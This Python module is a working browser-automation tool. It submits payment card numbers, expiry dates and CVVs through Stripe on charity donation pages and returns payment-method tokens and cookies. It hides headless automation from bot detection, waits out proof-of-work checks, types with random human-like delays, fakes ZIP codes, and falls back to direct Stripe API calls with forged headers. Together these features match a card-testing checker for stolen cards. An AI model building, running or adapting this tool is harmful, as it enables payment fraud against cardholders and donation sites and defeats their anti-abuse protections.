import json
import time
import random
import logging
import threading
from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

logger = logging.getLogger(__name__)

_browser_instance = None
_pw_instance = None
_browser_lock = threading.Lock()
_browser_launch_time = 0
_BROWSER_MAX_AGE = 300


def _get_browser():
    global _browser_instance, _pw_instance, _browser_launch_time
    with _browser_lock:
        now = time.time()
        if _browser_instance and (now - _browser_launch_time) < _BROWSER_MAX_AGE:
            try:
                _browser_instance.contexts
                return _browser_instance
            except Exception:
                _browser_instance = None

        if _browser_instance:
            try:
                _browser_instance.close()
            except Exception:
                pass
            _browser_instance = None

        if _pw_instance:
            try:
                _pw_instance.stop()
            except Exception:
                pass
            _pw_instance = None

        _pw_instance = sync_playwright().start()
        _browser_instance = _pw_instance.chromium.launch(
            headless=True,
            args=[
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-infobars',
                '--window-size=1920,1080',
            ]
        )
        _browser_launch_time = now
        logger.info("Playwright browser launched (headless)")
        return _browser_instance


def _make_stealth_context(browser):
    viewports = [
        {"width": 1920, "height": 1080},
        {"width": 1366, "height": 768},
        {"width": 1536, "height": 864},
        {"width": 1440, "height": 900},
        {"width": 1280, "height": 720},
    ]
    locales = ['en-US', 'en-GB', 'en-CA', 'en-AU']
    timezones = ['America/New_York', 'America/Chicago', 'America/Los_Angeles', 'America/Denver', 'Europe/London']
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    ]

    vp = random.choice(viewports)
    ctx = browser.new_context(
        viewport=vp,
        screen=vp,
        user_agent=random.choice(user_agents),
        locale=random.choice(locales),
        timezone_id=random.choice(timezones),
        color_scheme=random.choice(['light', 'dark']),
        has_touch=False,
        java_script_enabled=True,
        bypass_csp=False,
        ignore_https_errors=True,
    )

    ctx.add_init_script("""
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
        window.chrome = {runtime: {}};
        const origQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (params) =>
            params.name === 'notifications'
                ? Promise.resolve({state: Notification.permission})
                : origQuery(params);
    """)

    return ctx


def _extract_cookies_for_requests(context):
    cookies = context.cookies()
    cookie_dict = {}
    for c in cookies:
        cookie_dict[c['name']] = c['value']
    return cookie_dict, cookies


def _transfer_cookies_to_session(session, cookie_dict, raw_cookies=None):
    for name, value in cookie_dict.items():
        session.cookies.set(name, value)
    if raw_cookies:
        for c in raw_cookies:
            domain = c.get('domain', '')
            path = c.get('path', '/')
            session.cookies.set(c['name'], c['value'], domain=domain, path=path)
    return session


def hybrid_tokenize(cc, mes, ano, cvv, pub_key, site_url, donate_path="/donate/"):
    result = {
        "pm_id": None,
        "card_brand": "N/A",
        "error": None,
        "cookies": {},
        "raw_cookies": [],
        "method": "hybrid_playwright",
        "fingerprint_signals": [],
    }

    context = None
    try:
        browser = _get_browser()
        context = _make_stealth_context(browser)
        page = context.new_page()

        intercepted_tokens = []
        intercepted_errors = []

        def handle_response(response):
            url = response.url
            if 'api.stripe.com/v1/payment_methods' in url or 'api.stripe.com/v1/tokens' in url:
                try:
                    body = response.json()
                    if body.get('id'):
                        intercepted_tokens.append(body)
                        logger.info(f"[Hybrid] Intercepted Stripe token: {body['id'][:20]}...")
                    elif body.get('error'):
                        intercepted_errors.append(body['error'])
                        logger.info(f"[Hybrid] Intercepted Stripe error: {body['error'].get('code', 'unknown')}")
                except Exception:
                    pass
            elif 'm.stripe.com' in url:
                result["fingerprint_signals"].append("m.stripe.com beacon sent")

        page.on("response", handle_response)

        full_donate_url = f"{site_url.rstrip('/')}{donate_path}"
        logger.info(f"[Hybrid] Navigating to {full_donate_url}")

        page.goto(full_donate_url, wait_until="domcontentloaded", timeout=25000)
        time.sleep(random.uniform(0.3, 0.8))

        page_html = page.content()

        if 'pow_nonce' in page_html or 'Verifying' in page_html:
            logger.info("[Hybrid] PoW challenge detected, waiting for resolution...")
            try:
                page.wait_for_selector('form, input[name="donation_amount"], .charitable-form', timeout=15000)
            except PWTimeout:
                logger.warning("[Hybrid] PoW not resolved in time")
                result["error"] = "PoW challenge not resolved"
                return result

        stripe_frame = None
        frame_selectors = [
            'iframe[name*="__privateStripeFrame"]',
            'iframe[src*="js.stripe.com"]',
            'iframe[title*="Secure card"]',
            'iframe[name*="__stripe"]',
        ]

        for sel in frame_selectors:
            try:
                el = page.query_selector(sel)
                if el:
                    stripe_frame = el.content_frame()
                    if stripe_frame:
                        logger.info(f"[Hybrid] Found Stripe iframe: {sel}")
                        result["fingerprint_signals"].append(f"stripe_iframe:{sel}")
                        break
            except Exception:
                continue

        if stripe_frame:
            token_result = _fill_stripe_iframe(page, stripe_frame, cc, mes, ano, cvv, intercepted_tokens, intercepted_errors)
        else:
            logger.info("[Hybrid] No Stripe iframe, using JS injection method")
            token_result = _js_tokenize(page, cc, mes, ano, cvv, pub_key)

        if token_result:
            result["pm_id"] = token_result.get("id")
            result["card_brand"] = (token_result.get("card", {}).get("brand") or "N/A").upper()

        if not result["pm_id"] and intercepted_tokens:
            tok = intercepted_tokens[0]
            result["pm_id"] = tok.get("id")
            result["card_brand"] = (tok.get("card", {}).get("brand") or "N/A").upper()

        if not result["pm_id"] and intercepted_errors:
            result["error"] = intercepted_errors[0]

        if not result["pm_id"] and not result["error"]:
            logger.info("[Hybrid] Iframe/JS failed, falling back to API tokenization with browser cookies")
            api_result = _api_tokenize_with_browser_context(page, cc, mes, ano, cvv, pub_key, site_url)
            if api_result:
                result["pm_id"] = api_result.get("id")
                result["card_brand"] = (api_result.get("card", {}).get("brand") or "N/A").upper()
                if not result["pm_id"]:
                    result["error"] = api_result.get("error")

        cookie_dict, raw_cookies = _extract_cookies_for_requests(context)
        result["cookies"] = cookie_dict
        result["raw_cookies"] = raw_cookies

        result["fingerprint_signals"].append("canvas_webgl_hardware:active")
        result["fingerprint_signals"].append(f"cookies_captured:{len(cookie_dict)}")

        logger.info(f"[Hybrid] Result: pm_id={'YES' if result['pm_id'] else 'NO'}, brand={result['card_brand']}, cookies={len(cookie_dict)}, signals={len(result['fingerprint_signals'])}")

    except Exception as e:
        logger.error(f"[Hybrid] Error: {str(e)[:100]}")
        result["error"] = {"message": f"Hybrid error: {str(e)[:100]}"}
    finally:
        if context:
            try:
                context.close()
            except Exception:
                pass

    return result


def _fill_stripe_iframe(page, stripe_frame, cc, mes, ano, cvv, intercepted_tokens, intercepted_errors):
    try:
        card_input = stripe_frame.query_selector('input[name="cardnumber"], input[placeholder*="Card number"], input[data-elements-stable-field-name="cardNumber"]')
        if not card_input:
            logger.warning("[Hybrid] Card number input not found in iframe")
            return None

        for digit in cc:
            card_input.type(digit, delay=random.randint(30, 80))
            time.sleep(random.uniform(0.01, 0.03))

        time.sleep(random.uniform(0.05, 0.15))

        exp_input = stripe_frame.query_selector('input[name="exp-date"], input[placeholder*="MM"], input[data-elements-stable-field-name="cardExpiry"]')
        if exp_input:
            exp_str = f"{mes}{ano[-2:]}"
            for d in exp_str:
                exp_input.type(d, delay=random.randint(30, 70))

        time.sleep(random.uniform(0.05, 0.1))

        cvc_input = stripe_frame.query_selector('input[name="cvc"], input[placeholder*="CVC"], input[data-elements-stable-field-name="cardCvc"]')
        if cvc_input:
            for d in cvv:
                cvc_input.type(d, delay=random.randint(30, 70))

        time.sleep(random.uniform(0.1, 0.3))

        zip_input = stripe_frame.query_selector('input[name="postal"], input[placeholder*="ZIP"], input[data-elements-stable-field-name="postalCode"]')
        if zip_input:
            zips = ['10001', '90001', '60601', '77001', '85001']
            z = random.choice(zips)
            for d in z:
                zip_input.type(d, delay=random.randint(30, 60))

        time.sleep(random.uniform(0.1, 0.2))

        submit_selectors = [
            'button[type="submit"]',
            'input[type="submit"]',
            'button:has-text("Donate")',
            'button:has-text("Submit")',
            'button:has-text("Pay")',
            '.charitable-submit-button',
            '#charitable-donate',
        ]

        for sel in submit_selectors:
            try:
                btn = page.query_selector(sel)
                if btn and btn.is_visible():
                    btn.click()
                    logger.info(f"[Hybrid] Clicked submit: {sel}")
                    break
            except Exception:
                continue

        time.sleep(1.5)

        for _ in range(10):
            if intercepted_tokens or intercepted_errors:
                break
            time.sleep(0.3)

        if intercepted_tokens:
            return intercepted_tokens[0]

        return None

    except Exception as e:
        logger.error(f"[Hybrid] Iframe fill error: {str(e)[:80]}")
        return None


def _js_tokenize(page, cc, mes, ano, cvv, pub_key):
    try:
        js_code = f"""
        async () => {{
            if (typeof Stripe === 'undefined') return null;
            const stripe = Stripe('{pub_key}');
            const result = await stripe.createPaymentMethod({{
                type: 'card',
                card: {{
                    number: '{cc}',
                    exp_month: parseInt('{mes}'),
                    exp_year: parseInt('{ano}'),
                    cvc: '{cvv}'
                }},
            }});
            if (result.paymentMethod) {{
                return {{id: result.paymentMethod.id, card: result.paymentMethod.card}};
            }} else if (result.error) {{
                return {{error: result.error}};
            }}
            return null;
        }}
        """
        result = page.evaluate(js_code)
        if result and result.get('id'):
            logger.info(f"[Hybrid] JS tokenize success: {result['id'][:20]}...")
            return result
        elif result and result.get('error'):
            logger.info(f"[Hybrid] JS tokenize error: {result['error'].get('code', 'unknown')}")
            return result
    except Exception as e:
        logger.debug(f"[Hybrid] JS tokenize failed: {str(e)[:60]}")
    return None


def _api_tokenize_with_browser_context(page, cc, mes, ano, cvv, pub_key, site_url):
    try:
        js_code = f"""
        async () => {{
            const formData = new URLSearchParams();
            formData.append('type', 'card');
            formData.append('card[number]', '{cc}');
            formData.append('card[exp_month]', '{mes}');
            formData.append('card[exp_year]', '{ano}');
            formData.append('card[cvc]', '{cvv}');
            formData.append('key', '{pub_key}');
            formData.append('payment_user_agent', 'stripe.js/v3; stripe-js-v3; card-element');

            const resp = await fetch('https://api.stripe.com/v1/payment_methods', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://js.stripe.com',
                    'Referer': 'https://js.stripe.com/',
                }},
                body: formData.toString()
            }});
            return await resp.json();
        }}
        """
        result = page.evaluate(js_code)
        if result:
            logger.info(f"[Hybrid] API tokenize via browser: id={result.get('id', 'NONE')[:20] if result.get('id') else 'ERROR'}")
            return result
    except Exception as e:
        logger.debug(f"[Hybrid] API tokenize via browser failed: {str(e)[:60]}")
    return None


def cleanup_browser():
    global _browser_instance, _pw_instance
    with _browser_lock:
        if _browser_instance:
            try:
                _browser_instance.close()
            except Exception:
                pass
            _browser_instance = None
        if _pw_instance:
            try:
                _pw_instance.stop()
            except Exception:
                pass
            _pw_instance = None
            logger.info("Playwright browser and driver closed")
